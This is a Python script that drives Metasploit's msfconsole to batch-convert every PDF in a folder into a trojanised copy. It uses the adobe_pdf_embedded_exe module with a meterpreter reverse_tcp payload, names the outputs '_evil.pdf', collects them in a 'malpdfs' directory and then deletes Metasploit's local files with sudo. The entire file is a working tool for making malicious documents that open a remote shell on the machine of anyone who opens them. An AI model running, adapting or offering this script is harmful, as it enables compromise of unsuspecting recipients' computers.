import os
import subprocess

# Directory containing PDF files
pdf_directory = "./cleanpdfs"

# Metasploit commands
msf_commands = [
    "use exploit/windows/fileformat/adobe_pdf_embedded_exe",
    "set payload windows/x64/meterpreter/reverse_tcp",
    "exploit",
]

# Open msfconsole
process = subprocess.Popen(["sudo", "msfconsole"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

# Send Metasploit commands
for command in msf_commands:
    process.stdin.write(command + "\n")
    process.stdin.flush()

# Iterate over PDF files in the directory
for pdf_file in os.listdir(pdf_directory):
    if pdf_file.endswith(".pdf"):
        # Set the original name without extension
        original_name = os.path.splitext(pdf_file)[0]

        # Set FILENAME and INFILENAME in Metasploit
        set_filename_command = f"set FILENAME {original_name}_evil.pdf"
        set_infilename_command = f"set INFILENAME {os.path.join(pdf_directory, pdf_file)}"

        process.stdin.write(set_filename_command + "\n")
        process.stdin.write(set_infilename_command + "\n")
        process.stdin.write("exploit\n")
        process.stdin.flush()

        print(f"Exploited {pdf_file}")

# Exit msfconsole
process.stdin.write("exit\n")
process.stdin.flush()

# Wait for the process to complete
output, error = process.communicate()

# Print the output and error messages
print("Output:", output)
print("Error:", error)

# Move files to malpdfs directory
move_command = "sudo sh -c 'cp /root/.msf4/local/* $(pwd)/malpdfs/'"
subprocess.run(move_command, shell=True)

# Delete content from /root/.msf4/local/
delete_command = "sudo rm -r /root/.msf4/local/*"
subprocess.run(delete_command, shell=True)

print("Files moved to malpdfs and /root/.msf4/local/ content deleted.")

